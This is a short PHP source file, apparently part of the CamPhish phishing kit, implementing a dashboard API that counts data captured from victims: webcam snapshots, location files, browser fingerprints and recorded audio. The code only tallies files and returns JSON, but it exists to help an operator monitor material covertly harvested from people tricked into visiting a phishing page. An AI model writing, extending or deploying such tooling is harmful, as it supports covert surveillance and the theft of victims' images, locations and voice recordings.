<?php
/**
 * CamPhish Dashboard API - Get Stats
 * Author: Rahul Kushwaha
 * Returns counts of captured data
 */

header('Content-Type: application/json');
header('Cache-Control: no-cache, must-revalidate');

// Base path to the root CamPhish directory (relative to this API file location)
$basePath = dirname(dirname(__DIR__));

// Count cam*.png files in root directory
$imageFiles = glob($basePath . '/cam*.png');
$imagesCount = is_array($imageFiles) ? count($imageFiles) : 0;

// Count location files
$savedLocations = glob($basePath . '/saved_locations/*.txt');
$rootLocations = glob($basePath . '/location_*.txt');
$savedCount = is_array($savedLocations) ? count($savedLocations) : 0;
$rootCount = is_array($rootLocations) ? count($rootLocations) : 0;
$locationsCount = $savedCount + $rootCount;

// Count fingerprint files
$fingerprintFiles = glob($basePath . '/fingerprints/*.json');
$fingerprintsCount = is_array($fingerprintFiles) ? count($fingerprintFiles) : 0;

// Count audio files
$audioFiles = glob($basePath . '/audio_captures/*.webm');
$audioCount = is_array($audioFiles) ? count($audioFiles) : 0;

echo json_encode([
    'images' => $imagesCount,
    'locations' => $locationsCount,
    'fingerprints' => $fingerprintsCount,
    'audio' => $audioCount
]);
